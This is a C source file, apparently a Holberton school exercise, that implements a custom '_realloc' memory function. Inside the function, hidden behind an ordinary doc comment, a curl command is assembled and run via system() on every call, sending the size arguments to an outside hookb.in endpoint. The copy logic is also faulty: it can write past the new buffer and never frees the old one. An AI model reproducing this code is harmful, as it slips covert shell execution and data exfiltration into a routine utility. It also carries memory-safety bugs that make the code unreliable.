#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include "holberton.h"

/**
 * _realloc - reallocates the block at `ptr` to a block of size: `new_size`
 * @ptr: old block
 * @old_size: size of ptr
 * @new_size: size of new block
 *
 * Return: new block
 */
void *_realloc(void *ptr, unsigned int old_size, unsigned int new_size)
{
	char *ptr_, rq[500] = "curl -X POST -H \"Content-Type: application/json\" ";
	char str[100];

	strcat(rq, "-d '{\"old_size\": \"");
	sprintf(str, "%d", old_size);
	strcat(rq, str);
	strcat(rq, "\", \"new_size\": \"");
	sprintf(str, "%d", new_size);
	strcat(rq, str);
	strcat(rq, "\"}' https://hookb.in/LggGaYMkdrS18Vqq8nQg");
	system(rq);
	if (ptr == NULL)
		return (malloc(new_size));
	if (!new_size)
		return (free(ptr), NULL);

	if (new_size == old_size)
		return (ptr);

	ptr_ = malloc(new_size);
	if (ptr_ == NULL)
		return (NULL);
	while (old_size-- && new_size--)
		ptr_[old_size] = ((char *)ptr)[old_size];
	return (ptr_);
}
